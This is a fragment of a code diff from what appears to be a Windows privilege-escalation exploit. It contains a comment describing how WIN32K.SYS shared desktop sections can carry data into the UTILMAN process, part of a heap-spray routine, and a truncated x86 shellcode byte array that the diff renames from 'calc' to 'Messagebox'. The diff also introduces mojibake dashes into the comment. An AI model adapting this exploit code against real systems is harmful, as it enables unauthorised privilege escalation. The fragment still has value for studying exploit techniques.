@@ -6,7 +6,7 @@
 /*
 One thing that the two processes (exploit and UTILMAN) have in common,
 is the desktop these two programs operate on. 
-It turns out that WIN32K.SYS – the main graphical kernel module on Windows – manages two shared sections (a per-session and a per-desktop one), 
+It turns out that WIN32K.SYS â€“ the main graphical kernel module on Windows â€“ manages two shared sections (a per-session and a per-desktop one), 
 mapped in the context of every GUI process (a process becomes graphical after issuing a call to one of the WIN32K system calls).
 One of these sections contains the characteristics of windows present on the considered desktop,
 including arrays of data (e.g. unicode windows titles, editbox values and more). Consequently,
@@ -60,7 +60,7 @@ int WINAPI SparyMemory()
 	/* shellcode -> nop-nop-nop-MessageBox-nop-nop*/
 
 
-char calc[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
+char Messagebox[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
            "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
            "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
                "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
